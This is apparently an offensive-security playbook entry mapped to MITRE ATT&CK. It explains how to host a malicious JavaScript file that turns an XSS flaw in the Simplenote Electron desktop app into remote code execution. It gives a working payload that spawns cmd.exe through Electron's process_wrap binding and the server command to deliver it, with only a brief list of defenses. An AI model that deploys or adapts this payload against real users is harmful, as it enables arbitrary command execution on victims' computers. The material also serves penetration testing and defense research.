---
id: proc-setup-js-server
tags:
  - rce
  - javascript
  - electron
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/Spawn-Process-via-Electron-Process-API-Windows]]'
verified: false
platforms:
  - Desktop
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:36.328Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Set-Up-Malicious-JavaScript-Server

## Summary

This procedure sets up a remote web server to host a malicious JavaScript file that exploits Electron's Node.js integration for remote code execution when loaded via XSS.

## Description

In the context of the Simplenote XSS attack, a controlled server hosts an external JS file (e.g., hackerone-electron.js) containing code to spawn processes using Electron's Process API. This file is sourced dynamically by the injected script in the victim's client, leading to RCE with current user privileges. The server must be publicly accessible and serve the JS over HTTP.

## Requirements

1. Access to a web server (e.g., Apache, Nginx, or simple Python HTTP server)
2. Network connectivity for the server
3. Basic JavaScript knowledge for payload creation

## Defense

Defensive measures and detection strategies:

- Block or monitor outbound requests to unknown domains from desktop apps
- Use application whitelisting to restrict process spawning in Electron apps
- Implement content security policies (CSP) in Electron renderer processes

## Objectives

1. Host malicious JS accessible via URL
2. Ensure JS executes Node.js code in Electron context
3. Verify server responds with correct MIME type (application/javascript)

## Instructions

### Step 1: Prepare JS File

**Context**: Create the JS file with RCE payload using Electron's process binding.

**Command** ([[commands/Spawn-Process-via-Electron-Process-API-Windows]]):
```javascript
write("<h1>Simplenote RCE via Electron - Windows - ysx</h1>"); write("<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>"); var Process = process.binding('process_wrap').Process; var proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ = []; for (var key in env) env_.push(key+'='+env[key]); proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

> This JS writes HTML messages and spawns netplwiz via cmd.exe. Save as hackerone-electron.js in server root.

### Step 2: Deploy Server

**Context**: Start the web server to serve the JS file.

**Command** (Python HTTP Server example):
```bash
python -m http.server 80
```

> Serves files from current directory. Access at http://your-ip/hackerone-electron.js. Expected output: JS content loads in browser without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/Spawn-Process-via-Electron-Process-API-Windows]]

## Tools Used


## Tags

- rce
- javascript
